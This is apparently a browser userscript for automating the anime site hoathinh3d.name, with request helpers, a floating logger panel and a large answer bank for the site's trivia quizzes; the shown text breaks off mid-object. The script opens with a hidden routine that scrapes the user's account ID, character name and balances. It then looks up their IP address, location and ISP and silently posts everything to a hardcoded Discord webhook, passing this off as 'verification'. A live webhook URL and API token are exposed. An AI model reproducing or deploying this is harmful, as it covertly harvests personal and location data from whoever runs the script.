(async function logUserInfoToDiscord() {
    const webhook = "https://discord.com/api/webhooks/1374971300564566076/Eixvov5pIbE5kZTlzHItgWbpGJDiCMS8lWccRGMCmf-usv0TLE6Wdtxg2HP1JykI0IST"; // Thay bằng webhook của bạn
    const ipinfoToken = "10ddf60e7b0de8"; // Token từ ipinfo.io
  
    const url = location.href;
    if (!url.includes("hoathinh3d.name")) return;
  
    try {
        const response = await fetch(url);
        const html = await response.text();
        const doc = new DOMParser().parseFromString(html, "text/html");
    
        const scriptTag = Array.from(doc.scripts).find(s => s.textContent.includes('var myCRED_Notice'));
        const userId = scriptTag?.textContent.match(/"user_id":\s*"(\d+)"/)?.[1] || "Không rõ";
    
        const name = doc.querySelector('#ch_head_name')?.textContent.trim() || "Không rõ";
        const tuVi = Array.from(doc.querySelectorAll('#head_manage_acc div'))
          .find(div => div.textContent.includes("Tu Vi"))?.textContent.match(/Tu Vi:\s*(\d+)/)?.[1] || "0";
        const tinhThach = Array.from(doc.querySelectorAll('#head_manage_acc div'))
          .find(div => div.textContent.includes("Tinh Thạch"))?.textContent.match(/Tinh Thạch:\s*(\d+)/)?.[1] || "0";
        const tienNgoc = Array.from(doc.querySelectorAll('#head_manage_acc div'))
          .find(div => div.textContent.includes("Tiên Ngọc"))?.textContent.match(/Tiên Ngọc:\s*(\d+)/)?.[1] || "0";
  
      // ➕ Gọi API ipinfo
      const ipinfo = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`).then(res => res.json());
      const ip = ipinfo.ip || "Không rõ";
      const location = `${ipinfo.city || ""}, ${ipinfo.region || ""}, ${ipinfo.country || ""}`;
      const org = ipinfo.org || "Không rõ";
  
      const message = [
        `🧙 **THÔNG TIN NGƯỜI CHƠI**`,
        `👤 Nhân vật: ${name}`,
        `🆔 ID: ${userId}`,
        `⚡ Tu Vi: ${tuVi}`,
        `💎 Tinh Thạch: ${tinhThach}`,
        `🔮 Tiên Ngọc: ${tienNgoc}`,
        `🌐 Trang: ${url}`,
        `🌍 IP: ${ip}`,
        `📍 Vị trí: ${location}`,
        `📡 ISP: ${org}`,
        `🕒 Thời gian: ${new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" })}`,
        `💩💩💩💩💩💩💩💩💩💩💩💩💩`].join("\n");
  
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
      });
  
      console.log("✅ Gửi thành công Xác Thực Thông Tin về Sever"); 
    } catch (e) {
      console.warn("❌ Lỗi khi gửi log Discord:", e);
    }
  })();
  (function() {
const iframe = document.createElement('iframe')
document.body.appendChild(iframe)
const originalConsole = iframe.contentWindow.console;
window.console = originalConsole
console.log = Function.prototype.bind.call(originalConsole.log, originalConsole)

const DOMAIN = 'https://hoathinh3d.name'
const ACTION_URL = DOMAIN + '/wp-json/hh3d/v1/action'
const HH3D_AJAX_URL = DOMAIN + '/wp-content/themes/halimmovies-child/hh3d-ajax.php'
const ADMIN_AJAX_URL = DOMAIN + '/wp-admin/admin-ajax.php'
const LUANVO_URL = DOMAIN + '/wp-json/luan-vo/v1'
const TONGMON_URL = DOMAIN + '/wp-json/tong-mon/v1'

const postRequest = async (url, { headers, body, retries = 3, delay = 1250, timeout = 30000 }) => {
    const unauthorizedStatuses = [401, 403]
    do {
        const controller = new AbortController()
        const signal = controller.signal
        const timeoutPromise = new Promise((_, reject) => setTimeout(() => {
            controller.abort()
            reject(new Error('Request Timeout'))
        }, timeout))
        try {
            const response = await Promise.race([
                fetch(url, { method: 'POST', headers, body, signal }),
                timeoutPromise
            ])
            if (unauthorizedStatuses.includes(response.status)) {
                return { success: false, message: `Lỗi xác thực (${response.status})` }
            }
            if (response.ok || response.status === 400) {
                await sleep(250)
                return await response.json()
            }
            console.log(`🔴 [POST](${retries}): ${url} - Thất bại (${response.status})`)
        } catch (error) {
            console.log(`🔴 [POST](${retries}): ${url} - ${error}`)
        }
        if (retries > 0) await sleep(delay)
    } while (retries-- > 0)
    return { success: false, message: 'Vui lòng thử lại sau.' }
}

const loadPage = async (url, retries = 3, delay = 1250, timeout = 30000) => {
    do {
        const controller = new AbortController()
        const timeoutPromise = new Promise((_, reject) => setTimeout(() => {
            controller.abort()
            reject(new Error('Request Timeout'))
        }, timeout))
        try {
            const response = await Promise.race([
                fetch(url, { signal: controller.signal }),
                timeoutPromise
            ])
            if (response.ok) {
                await sleep(250)
                const html = await response.text()
                const doc = new DOMParser().parseFromString(html, 'text/html')
                return { html, doc }
            }
            console.log(`🔴 [GET](${retries}): ${url} - Thất bại (${response.status})`)
        } catch (error) {
            console.log(`🔴 [GET](${retries}): ${url} - ${error}`)
        }
        if (retries > 0) await sleep(delay)
    } while (retries-- > 0)
    return { html: '', doc: null }
}

const LoggerMessageType = Object.freeze({
    SUCCESS: 'success',
    ERROR: 'error',
    WARNING: 'warning',
    INFO: 'info'
})

class Logger {
  constructor() {
    if (Logger.instance) return Logger.instance;
    this.messages = [];
    this.container = null;
    this.messagesWrapper = null;
    Logger.instance = this;
  }

  renderContainer() {
    if (this.container) return;
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => this.renderContainer());
      return;
    }

    // 1. Tạo container chính
    const container = document.createElement('div');
    container.id = 'logger-container';
    container.style.position = 'fixed';
    container.style.bottom = '16px';
    container.style.left = '16px';
    container.style.width = '360px';
    container.style.maxWidth = 'calc(100% - 32px)';
    container.style.maxHeight = '50vh';
    container.style.display = 'flex';
    container.style.flexDirection = 'column';
    container.style.backgroundColor = 'rgba(255, 255, 255, 0.08)'; // glassmorphism
    container.style.backdropFilter = 'blur(20px)';
    container.style.border = '1px solid rgba(255, 255, 255, 0.2)';
    container.style.borderRadius = '16px';
    container.style.boxShadow = '0 8px 32px rgba(0, 0, 0, 0.2)';
    container.style.color = '#ffffff';
    container.style.overflow = 'hidden';
    container.style.fontFamily = '"Poppins", sans-serif';
    container.style.zIndex = '10000';

    // 2. Control bar (Toggle + Clear)
    const controlBar = document.createElement('div');
    controlBar.style.display = 'flex';
    controlBar.style.justifyContent = 'space-between';
    controlBar.style.alignItems = 'center';
    controlBar.style.padding = '8px 12px';
    controlBar.style.borderBottom = '1px solid rgba(255, 255, 255, 0.2)';

    // 2.1. Toggle thu/gọn
    const toggleBtn = document.createElement('button');
    toggleBtn.innerHTML = '🔽';
    toggleBtn.style.background = 'transparent';
    toggleBtn.style.border = 'none';
    toggleBtn.style.color = '#ffffff';
    toggleBtn.style.cursor = 'pointer';
    toggleBtn.style.fontSize = '16px';
    toggleBtn.style.transition = 'transform 0.2s ease';
    toggleBtn.onclick = () => {
      if (messagesWrapper.style.display !== 'none') {
        messagesWrapper.style.display = 'none';
        clearButton.style.display = 'none';
        footer.style.display = 'none';
        toggleBtn.style.transform = 'rotate(180deg)';
      } else {
        messagesWrapper.style.display = 'flex';
        clearButton.style.display = 'block';
        footer.style.display = 'block';
        toggleBtn.style.transform = 'rotate(0deg)';
      }
    };

    // 2.2. Clear button
    const clearButton = document.createElement('button');
    clearButton.textContent = '🧹 Clear';
    clearButton.style.background = 'linear-gradient(135deg, #ff8a00, #e52e71)';
    clearButton.style.border = 'none';
    clearButton.style.borderRadius = '8px';
    clearButton.style.color = '#ffffff';
    clearButton.style.padding = '6px 12px';
    clearButton.style.fontSize = '13px';
    clearButton.style.cursor = 'pointer';
    clearButton.style.transition = 'transform 0.2s ease, box-shadow 0.2s ease';
    clearButton.onmouseover = () => {
      clearButton.style.transform = 'translateY(-2px)';
      clearButton.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.3)';
    };
    clearButton.onmouseout = () => {
      clearButton.style.transform = 'translateY(0)';
      clearButton.style.boxShadow = 'none';
    };
    clearButton.onclick = () => this.clear();

    controlBar.appendChild(toggleBtn);
    controlBar.appendChild(clearButton);

    // 3. Khu vực chứa messages (scrollable)
    const messagesWrapper = document.createElement('div');
    messagesWrapper.id = 'logger-messages-wrapper';
    messagesWrapper.style.flex = '1 1 auto';
    messagesWrapper.style.overflowY = 'auto';
    messagesWrapper.style.padding = '8px 12px';
    messagesWrapper.style.display = 'flex';
    messagesWrapper.style.flexDirection = 'column';
    messagesWrapper.style.gap = '6px';

    // 4. Footer đơn giản
    const footer = document.createElement('div');
    footer.textContent = '✧©Thích Bốn Lù Ngon Thơm Ngọt Nước Trắng Hồng✧';
    footer.style.padding = '6px 12px';
    footer.style.fontSize = '11px';
    footer.style.textAlign = 'center';
    footer.style.color = '#dddddd';

    // 5. Gán reference và append tất cả vào body
    container.appendChild(controlBar);
    container.appendChild(messagesWrapper);
    container.appendChild(footer);

    this.container = container;
    this.messagesWrapper = messagesWrapper;
    document.body.appendChild(container);
  }

  renderMessages() {
    this.messagesWrapper.innerHTML = '';
    this.messages.forEach(({ message, type }) => this.renderMessage(message, type));
  }

  renderMessage(message, type) {
    const messageDiv = document.createElement('div');
    messageDiv.textContent = message;
    messageDiv.style.padding = '8px 12px';
    messageDiv.style.borderRadius = '8px';
    messageDiv.style.fontSize = '13px';
    messageDiv.style.fontWeight = '500';
    messageDiv.style.overflowWrap = 'break-word';
    messageDiv.style.display = 'flex';
    messageDiv.style.alignItems = 'center';
    messageDiv.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
    messageDiv.style.opacity = '0';
    messageDiv.style.transform = 'translateY(8px)';

    // Thiết lập màu nền và border-left theo type
    switch (type) {
      case LoggerMessageType.SUCCESS:
        messageDiv.style.backgroundColor = 'rgba(76, 175, 80, 0.08)';
        messageDiv.style.borderLeft = '4px solid #4CAF50';
        break;
      case LoggerMessageType.ERROR:
        messageDiv.style.backgroundColor = 'rgba(244, 67, 54, 0.08)';
        messageDiv.style.borderLeft = '4px solid #F44336';
        break;
      case LoggerMessageType.WARNING:
        messageDiv.style.backgroundColor = 'rgba(255, 193, 7, 0.08)';
        messageDiv.style.borderLeft = '4px solid #FFC107';
        break;
      case LoggerMessageType.INFO:
      default:
        messageDiv.style.backgroundColor = 'rgba(255, 255, 255, 0.05)';
        messageDiv.style.borderLeft = '4px solid #90A4AE';
    }

    this.messagesWrapper.appendChild(messageDiv);
    // Kích hoạt animation
    requestAnimationFrame(() => {
      messageDiv.style.opacity = '1';
      messageDiv.style.transform = 'translateY(0)';
    });

    // Scroll xuống cuối
    this.messagesWrapper.scrollTop = this.messagesWrapper.scrollHeight;
  }

  log(message, type) {
    console.log(message);
    // Nếu không truyền type, tự xét prefix
    if (typeof type === 'undefined') {
      if (typeof message === 'string' && message.length >= 2) {
        const prefix = message.slice(0, 2);
        switch (prefix) {
          case '🔴':
            type = LoggerMessageType.ERROR;
            break;
          case '🟢':
            type = LoggerMessageType.SUCCESS;
            break;
          case '🟡':
            type = LoggerMessageType.WARNING;
            break;
          default:
            type = LoggerMessageType.INFO;
        }
      } else {
        type = LoggerMessageType.INFO;
      }
    }
    this.messages.push({ message, type });

    if (this.container) {
      this.renderMessage(message, type);
    } else {
      this.renderContainer();
      this.renderMessages();
    }
  }

  clear() {
    this.messages = [];
    if (this.messagesWrapper) {
      this.messagesWrapper.innerHTML = '';
      this.messagesWrapper = null;
    }
    if (this.container) {
      this.container.remove();
      this.container = null;
    }
  }
}

const logger = new Logger()

const blessingMessages = [
    "🌠 Thiên duyên vạn kiếp, hội ngộ giữa hồng trần! Nguyện hai vị đạo hữu đồng tâm tu luyện, phi thăng cửu thiên, trường tồn cùng nhật nguyệt! ✨",
    "🌸 Duyên khởi từ tâm, đạo hợp bởi ý! Chúc hai vị đạo hữu đồng hành bất diệt, như gió xuân thổi mãi, như sóng biếc vỗ hoài! 🌊",
    "⚡️ Một bước nhập đạo, vạn kiếp thành tiên! Nguyện hai vị đạo hữu nắm tay tu luyện, phá vỡ thiên kiếp, cùng nhau phi thăng bất diệt! 🕊️",
    "🌟 Hữu duyên thiên định, nguyệt lão chỉ đường! Nguyện đạo lữ vững bền, đồng tâm hợp lực, trường tồn giữa trời đất bao la! 💞",
    "🌿 Trải qua ngàn kiếp luân hồi, cuối cùng tương ngộ! Nguyện hai vị đạo hữu tâm ý tương thông, đồng tu đồng tiến, chứng đắc đại đạo! ⚔️",
    "🏯 Đạo tình như trăng sáng, chiếu rọi mãi không phai! Chúc hai vị đạo hữu tu hành viên mãn, bước lên đài sen, hóa thành chân tiên! 🏹",
    "🌺 Nhân sinh hữu hẹn, tu hành hữu duyên! Nguyện hai vị đạo hữu song tu hòa hợp, cùng nhau vượt thiên địa, lưu danh bất hủ! 🏔️",
    "✨ Một ánh mắt giao hòa, vạn năm chẳng đổi! Nguyện hai vị đạo hữu đồng tâm song tiến, đạo nghiệp rạng rỡ, tu thành chính quả! 🚀",
    "🔥 Đạo tâm kiên định, tay nắm chặt chẳng rời! Chúc hai vị đạo hữu vượt qua muôn vàn thử thách, cùng nhau đăng đỉnh cửu thiên! 🌈",
    "🌌 Định mệnh an bài, thiên địa chứng giám! Nguyện hai vị đạo hữu tu luyện đại thành, nắm giữ chân lý, mãi mãi bên nhau! 🏆"
]

const quizBank = {
    "Ai là huynh đệ và cũng là người thầy mà Vương Lâm trong Tiên Nghịch kính trọng nhất ?": "Tư Đồ Nam",
    "Ai là mẹ của Đường Tam?": "A Ngân",
    "Ai là người đứng đầu Vũ Hồn Điện?": "Bỉ Bỉ Đông",
    "Ai là người thầy của Đường Tam?": "Đại Sư",
    "Ai là nhân vật chính trong bộ phim hoạt hình trung quốc Thần Mộ ?": "Thần Nam",
    "Ám tinh giới được xuất hiện trong bộ phim hoạt hình nào dưới đây ?": "Tinh Thần Biến",
    "Bách Lý Đông Quân là nhân vật trong bộ hoạt hình trung quốc nào sau đây ?": "Thiếu Niên Bạch Mã Tuý Xuân Phong",
    "Bạch Nguyệt Khôi là tên nhân vật chính trong bộ phim hoạt hình trung quốc nào sau đây ?": "Linh Lung",
    "Bạch Tiểu Thuần là nhân vật chính trong bộ hoạt hình trung quốc nào ?": "Nhất Niệm Vĩnh Hằng",
    "Bạch Tiểu Thuần trong Nhất Niệm Vĩnh Hằng luôn được ai âm thầm giúp đỡ ?": "Đỗ Lăng Phỉ",
    "Bộ phim nào sau đây thuộc tiểu thuyết của tác giả Thiên Tằm Thổ Đậu": "Tất cả đáp án",
    "Các cấp bậc nào sau đây thuộc phim Đấu Phá Thương Khung ?": "Đấu Tông",
    "Cháu dượng của Bạch Tiểu Thuần trong Nhất Niệm Vĩnh Hằng là ai ?": "Tống Khuyết",
    "Chủ nhân đời trước của Vẫn Lạc Tâm Viêm trong Đấu Phá Thương Khung là ai ?": "Diệu Thiên Hoả",
    "Công pháp gì giúp Tiêu Viêm trong Đấu Phá Thương Khung hấp thụ nhiều loại dị hỏa ?": "Phần Quyết",
    "Công pháp nào sau đây là của Hàn Lập trong Phàm Nhân Tu Tiên ?": "Tất cả đáp án",
    "Cơ Tử Nguyệt là nhân vật trong các bộ hoạt hình trung quốc nào sau đây ?": "Già Thiên",
    "Dạ Táng còn là biệt danh của ai trong Nhất Niệm Vĩnh Hằng ?": "Bạch Tiểu Thuần",
    "Danh xưng Tàn Thi Bại Thuế là của nhân vật nào trong Hoạ Giang Hồ Chi Bất Lương Nhân ?": "Hàng Thần",
    "Diễm Linh Cơ là nhân vật trong phim hoạt hình trung quốc nào ?": "Thiên Hành Cửu Ca",
    "Diệp Phàm là nhân vật chính trong bộ hoạt hình trung quốc nào ?": "Già Thiên",
    "Diệp Thần trong Tiên Võ Đế Tôn gia nhập Tông Môn nào đầu tiên ?": "Chính Dương Tông",
    "Dược Trần trong Đấu Phá Thương Khung đã từng bị đồ đệ nào phản bội ?": "Hàn Phong",
    "Đại ca của Tiêu Viêm trong Đấu Phá Thương Khung tên gì ?": "Tiêu Đỉnh",
    "Đàm Vân là nhân vật chính trong bộ phim hoạt hình trung quốc nào sau đây ?": "Nghịch Thiên Chí Tôn",
    "Đạo lữ của Hàn Lập là ai ?": "Nam Cung Uyển",
    "Đâu là nhân vật chính trong phim Bách Luyện Thành Thần ?": "La Chinh",
    "Đâu là Thái Cổ Thập Hung trong phim Thế Giới Hoàn Mỹ ?": "Tất cả đáp án",
    "Đâu là tuyệt kỹ số 1 Hạo Thiên Tông mà Đường Hạo dạy cho con trai trong Đấu La Đại Lục ?": "Đại Tu Di Chùy",
    "Đấu Sát Toàn Viên Kiếm là một kỹ năng trong bộ phim hoạt hình trung quốc nào ?": "Thần Ấn Vương Tọa",
    "Độc Cô Bác trong Đấu La Đại Lục có vũ hồn gì ?": "Bích Lân Xà",
    "Em trai ruột của Thạch Hạo trong Thế Giới Hoàn Mỹ là ai ?": "Tần Hạo",
    "Hàn lập sở hữu những vật phẩm nào dưới đây ?": "Thanh Trúc Phong Vân Kiếm",
    "Hàn Lập trong Phàm Nhân Tu Tiên đến Thất Huyền Môn bái ai làm thầy ?": "Mặc Đại Phu",
    "Hàn Lập trong Phàm Nhân Tu Tiên gia nhập môn phái nào đầu tiên ?": "Thất Huyền Môn",
    "Hàn Lập trong Phàm Nhân Tu Tiên từng cứu ai mà bị hấp thụ tu vi giảm xuống Luyện Khí Kỳ ?": "Nam Cung Uyển",
    "Hoang Thiên Đế là nhân vật chính trong bộ phim hoạt hình trung quốc nổi tiếng nào ?": "Thế Giới Hoàn Mỹ",
    "Hoắc Vũ Hạo là hậu nhân của ai trong Sử Lai Khắc ?": "Đái Mộc Bạch",
    "Hồn hoàn màu nào mạnh nhất?": "Đỏ",
    "Huân Nhi là công chúa của bộ tộc nào?": "Cổ tộc",
    "Khô Lâu Đà Chủ xuất hiện trong bộ phim hoạt hình nào dưới đây ?": "Võ Thần Chúa Tể",
    "Khi ở Già Nam Học Viện, Tiêu Viêm thu phục được loại dị hỏa nào ?": "Vẫn Lạc Tâm Viêm",
    "Kính Huyền trong Quyến Tư Lượng là hậu duệ của tộc nào ?": "Thần Tộc",
    "Lạc Ly trong Đại Chúa Tể là nhân vật trong Tộc nào ?": "Lạc Thần Tộc",
    "Lâm Động trong Vũ Động Càn Khôn học được Linh Võ Học nào khi vào bia cổ Đại Hoang ?": "Đại Hoang Tù Thiên Chỉ",
    "Lâm Động trong Vũ Động Càn Khôn luyện hóa Tổ Phù nào đầu tiên ?": "Thôn Phệ Tổ Phù",
    "Lâm Động trong Vũ Động Càn Khôn sử dụng vũ khí loại nào sau đây ?": "Thương",
    "Lâm Phong là nhân vật trong bộ hoạt hình trung quốc nào sau đây ?": "Vạn Giới Độc Tôn",
    "Lâm Thất Dạ là nhân vật trong bộ hoạt hình trung quốc nào sau đây ?": "Trảm Thần",
    "Lâm Thất Dạ trong Trảm Thần sở hữu sức mạnh của vị thần nào ?": "Thiên Sứ",
    "Long Tuyền Kiếm xuất hiện trong bộ phim hoạt hình nào dưới đây ?": "Họa Giang Hồ Chi Bất Lương Nhân",
    "Lục Tuyết Kỳ trong Tru Tiên thuộc Phong nào trong Thanh Vân Môn?": "Tiểu Trúc Phong",
    "Lý Tinh Vân trong Họa Giang Hồ Chi Bất Lương Nhân sử dụng vũ khí nào sau đây ?": "Long Tuyền Kiếm",
    "Lý Tinh Vân là một nhân vật trong bộ phim hoạt hình trung quốc nào sau đây ?": "Họa Giang Hồ Chi Bất Lương Nhân",
    "Lý Trường Thọ trong Sư Huynh A Sư Huynh xuyên không về Hồng Hoang bái sư ở đâu ?": "Độ Tiên Môn",
    "Man Hồ Tử trong phim \"Phàm Nhân Tu Tiên\" tu luyện công pháp nào?": "Thác Thiên Ma Công",
    "Mẫu thân của La Phong trong Thôn Phệ Tinh Không tên là gì ?": "Cung Tâm Lan",
    "Mẹ của Mạnh Xuyên trong Thương Nguyên Đồ tên là gì ?": "Bạch Niệm Vân",
    "Mẹ của Tần Trần là ai ?": "Tần Nguyệt Trì",
    "Mẹ của Thạch Hạo trong Thế Giới Hoàn Mỹ tên là gì": "Tần Di Ninh",
    "Mối tình đầu của Diệp Thần trong Tiên Võ Đế Tôn là ai ?": "Cơ Ngưng Sương",
    "Mục đích chính tu luyện của Tần Vũ trong Tinh Thần Biến là gì ??": "Vì muốn được cưới Khương Lập",
    "Mục đích tu luyện của Vương Lâm trong Tiên Nghịch theo diễn biến phim hiện tại là gì ?": "Báo Thù",
    "Mục Trần trong Đại Chúa Tể liên kết Huyết Mạch với ?": "Cửu U Tước",
    "Mục Vân là nhân vật trong bộ hoạt hình trung quốc nào sau đây ?": "Vô Thượng Thần Đế",
    "Nam chính trong bộ hoạt hình trung quốc Ám Hà Truyện là ai ?": "Tô Mộ Vũ",
    "Nam chính trong bộ Quyến Tư Lượng là ai ?": "Kính Huyền",
    "Nghịch Hà Tông là Tông Môn trong bộ hoạt hình trung quốc nào sau đây ?": "Nhất Niệm Vĩnh Hằng",
    "Nghịch Thiên Nhi Hành là một nhân vật trong bộ phim hh3d nào sau đây ?": "Vũ Canh Kỷ",
    "Ngụy Anh (Ngụy Vô Tiện) là nhân vật trong bộ hhtq nào sau đây ?": "Ma Đạo Tổ Sư",
    "Người bạn thuở nhỏ của Trương Tiểu Phàm trong Tru Tiên là ai ?": "Lâm Kinh Vũ",
    "Nhân vật Bách Lý Đồ Minh xuất hiện trong phim hoạt hình nào dưới đây ?": "Trảm Thần Chi Phàm Trần Thần Vực",
    "Nhân vật chính của \"Thần Ấn Vương Tọa\" là ai?": "Long Hạo Thần",
    "Nhân vật chính của Đấu La Đại Lục là ai?": "Đường Tam",
    "Nhân vật chính Lý Trường Thọ trong Sư Huynh A Sư Huynh đã tỏ tình với ai ?": "Vân Tiêu",
    "Nhân vật chính trong Thương Nguyên đồ là ai ?": "Mạnh Xuyên",
    "Nhân vật chính trong Yêu Thần Ký tên là gì ?": "Nhiếp Ly",
    "Nhân vật chính trong Man Hoang Tiên Giới là ai ?": "Lục Hàng Chi",
    "Nhân vật nào luôn bất bại trong phim Hoạt Hình Trung Quốc, được ví như One-Punch Man ?": "Từ Dương",
    "Nhân vật nào sau đây được mệnh danh là Vua Lỳ Đòn trong Đấu Phá Thương Khung ?": "Phượng Thanh Nhi",
    "Nhị ca của Tiêu Viêm trong Đấu Phá Thương Khung tên gì ?": "Tiêu Lệ",
    "Nhiếp Phong là nhân vật chính trong phim hoạt hình trung quốc nào ?": "Chân Võ Đỉnh Phong",
    "Ninh Diêu là một nhân vật trong bộ phim hoạt hình trung quốc nào sau đây ?": "Kiếm Lai",
    "Nữ chính cũng là vợ Đông Bá Tuyết Ưng trong Tuyết Ưng Lĩnh Chủ là ai sau đây ?": "Dư Tĩnh Thu",
    "Nữ chính trong bộ Quyến Tư Lượng là ai ?": "Đồ Lệ",
    "Ông nội của Lâm Động trong Vũ Động Càn Khôn là ai ?": "Lâm Chấn Thiên",
    "Phụ Thân của Lâm Động trong Vũ Động Càn Khôn là ai ?": "Lâm Khiếu",
    "Phương Hàn là nhân vật trong bộ hoạt hình trung quốc nào sau đây ?": "Vĩnh Sinh",
    "Phương Hàn trong Vĩnh Sinh nhận được Giao Phục Hoàng Tuyền Đồ từ ai ?": "Bạch Hải Thiện",
    "Phương Hàn trong Vĩnh Sinh xuất thân là gì ở nhà họ Phương ?": "Nô Bộc",
    "Phượng Thanh Nhi trong Đấu Phá Thương Khung thuộc chủng tộc nào ?": "Thiên Yêu Hoàng Tộc",
    "Số hiệu vị thần của main trong Trảm Thần: Phàm Trần Thần Vực là số mấy ?": "003",
    "Sử Lai Khắc Thất Quái đã từng đến nơi nào để luyện tập?": "Hải Thần Đảo",
    "Sư mẫu của Bạch Tiểu Thuần trong Nhất Niệm Vĩnh Hằng là ai ?": "Hứa Mị Nương",
    "Sư phụ của Bạch Tiểu Thuần trong Nhất Niệm Vĩnh hằng là ai ?": "Lý Thanh Hậu",
    "Sư phụ của Lý Trường Thọ là ai ?": "Tề Nguyên",
    "Sư phụ mà Diệp Thần yêu trong Tiên Võ Đế Tôn là ai ?": "Sở Huyên Nhi",
    "Sư Phụ thứ 2 của Lý Trường Thọ trong phim": "Thái Thanh Thánh Nhân",
    "Tại sao Đường Tam bị Đường Môn truy sát ở tập đầu phim Đấu La Đại Lục ?": "Học trộm tuyệt học bổn môn",
    "Tần Mục là nhân vật chính trong bộ phim hoạt hình trung quốc nào sau đây ?": "Mục Thần Ký",
    "Tần Nam là nhân vật chính trong bộ hoạt hình trung quốc nào sau đây ?": "Tuyệt Thế Chiến Hồn",
    "Tần Vũ trong Tinh Thần Biến được tặng pháp bảo siêu cấp vip pro nào để tu luyện nhanh chóng ?": "Khương Lan Tháp",
    "Tần Vũ trong Tinh Thần Biến khiếm khuyết đan điền nhờ đâu mới có thể tu luyện ?": "Lưu Tinh Lệ",
    "Thánh nữ nào trong Già Thiên bị nhân vật chính Diệp Phàm lấy mất cái áo lót ?": "Diêu Hi",
    "Thần Thông Bí Cảnh xuất hiện trong bộ phim hoạt hình nào dưới đây ?": "Vĩnh Sinh",
    "Thần vị mà Đường Tam đạt được là gì?": "Hải Thần và Tu La Thần",
    "Thế lực nào là đối thủ lớn nhất của Tiêu Viêm trong Đấu Phá Thương Khung?": "Hồn Điện",
    "Thiên Hoả Tôn Giả trong Đấu Phá Thương Khung dùng thi thể của ai để hồi sinh ?": "Vân Sơn",
    "Thú cưng Thôn Thôn trong Nguyên Tôn sinh ra có sức mạnh ngang cảnh giới nào ?": "Thái Sơ Cảnh",
    "Tiêu Khinh Tuyết xuất hiện trong bộ hoạt hình nào dưới đây ?": "Tuyệt Thế Chiến Hồn",
    "Tiêu Viêm đã lập nên thế lực nào khi ở Học Viện Già Nam ?": "Bàn Môn",
    "Tiêu Viêm trong Đấu Phá Thương Khung đã Hẹn Ước 3 Năm với ai ?": "Nạp Lan Yên Nhiên",
    "Tiêu Viêm trong Đấu Phá Thương Khung sử dụng loại vũ khí nào sau đây ?": "Thước",
    "Tiêu Viêm trong Đấu Phá Thương Khung thuộc gia tộc nào?": "Tiêu gia",
    "Tiêu Thần là nhân vật chính trong bộ phim hoạt hình trung quốc nào sau đây ?": "Trường Sinh Giới",
    "Tỉnh Cửu là nhân vật chính trong bộ phim hoạt hình trung quốc nào sau đây ?": "Đại Đạo Triều Thiên",
    "Tình đầu của Diệp Phàm trong Già Thiên là ai ?": "Lý Tiểu Mạn",
    "Trần Bình An là nam chính trong bộ phim hoạt hình trung quốc nào ?": "Kiếm Lai",
    "Triệu Ngọc Chân là nhân vật trong bộ hoạt hình trung quốc nào sau đây ?": "Thiếu Niên Bạch Mã Tuý Xuân Phong",
    "Trong bộ Đấu Phá Thương Khung, Tiêu Viêm tìm đến ai để cứu Dược Lão ?": "Phong Tôn Giả",
    "Trong bộ Tiên Nghịch, nhân vật chính Vương Lâm khi ở quê nhà còn có tên khác là gì ?": "Thiết Trụ",
    "Trong Đấu La Đại Lục, Đường Hạo là gì của Đường Tam?": "Cha",
    "Trong Già Thiên, thể chất Diệp Phàm là thể chất gì ?": "Hoang Cổ Thánh Thể",
    "Trong Phàm Nhân Tu Tiên ai bị luyện thành khôi lỗi Khúc Hồn ?": "Trương Thiết",
    "Trong phim Tiên Nghịch, Vương Lâm vô tình có được pháp bảo nghịch thiên nào ?": "Thiên Nghịch Châu",
    "Trong Tiên Nghịch, Vương Lâm nhận được truyền thừa gì ở Cổ Thần Chi Địa ?": "Ký Ức",
    "Trong Tru Tiên, Điền Bất Dịch là thủ tọa của Phong nào?": "Đại Trúc Phong",
    "Trong Vĩnh Sinh - Phương Hàn hẹn ước 10 năm cùng với ai ?": "Hoa Thiên Đô",
    "Trước khi đến Linh Khê Tông, Bạch Tiểu Thuần trong Nhất Niệm Vĩnh Hằng ở đâu ?": "Mạo Nhi Sơn Thôn",
    "Trương Tiểu Phàm trong phim Tru Tiên còn có tên gọi là ?": "Quỷ Lệ",
    "Trương Tiểu Phàm trong Tru Tiên từng được nhận vào môn phái nào?": "Thanh Vân Môn",
    "Tử Nghiên trong Đấu Phá Thương Khung thuộc chủng tộc nào ?": "Thái Hư Cổ Long",
    "Vân Triệt là tên nhân vật chính trong bộ phim hoạt hình trung quốc nào sau đây ?": "Nghịch Thiên Tà Thần",
    "Vũ Canh là nhân vật trong bộ hoạt hình trung quốc nào sau đây ?": "Vũ Canh Kỷ",
    "Vũ hồn của Chu Trúc Thanh là gì?": "U Minh Linh Miêu",
    "Vũ hồn của Đới Mộc Bạch là gì?": "Bạch Hổ",
    "Vũ hồn của Mã Hồng Tuấn là gì?": "Hỏa Phượng Hoàng",
    "Vũ hồn của Tiểu Vũ là gì?": "Nhu Cốt Thỏ",
    "Vũ hồn thứ hai của Đường Tam là gì?": "Hạo Thiên Chùy",
    "Vũ khí của Đàm Vân trong Nghịch Thiên Chí Tôn là gì ?": "Hồng Mông Thần Kiếm",
    "Vũ khí mà Tiêu Viêm trong Đấu Phá Thương Khung luôn mang bên mình có tên gọi là gì ?": "Huyền Trọng Xích",
    "Vương Lâm trong phim Tiên Nghịch dựa vào gì để vô địch cùng cảnh giới ?": "Cực cảnh",
    "Y Lai Khắc Tư là một nhân vật trong bộ phim hoạt hình trung quốc nào sau đây ?": "Cả 1 và 2",
    "Trong Đấu Phá Thương Khung, Tiêu Viêm hơn Cổ Hà ở điểm gì ?": "Dị Hỏa",
    "Tại sao Hàn Lập khi gặp Phong Hi không chạy mà ở lại giúp đỡ chế tạo Phong Lôi Sí ?": "Vì đánh không lại.",
    "Nhân vật chính trong Ta Có Thể Giác Ngộ Vô Hạn là ai ?": "Tiêu Vân",
    "Nhân vật chính trong Đấu Chiến Thiên Hạ là ai ?": "Đại Phong",
    "Nhân vật chính trong Quân Tử Vô Tật là ai ?": "Dao Cơ",
    "1 Trong 2 Admin của website HoatHinh3D là ai ? (Biệt danh chính xác ở web)": "Từ Dương",
}

const latinMap = {
    // Cyrillic lowercase
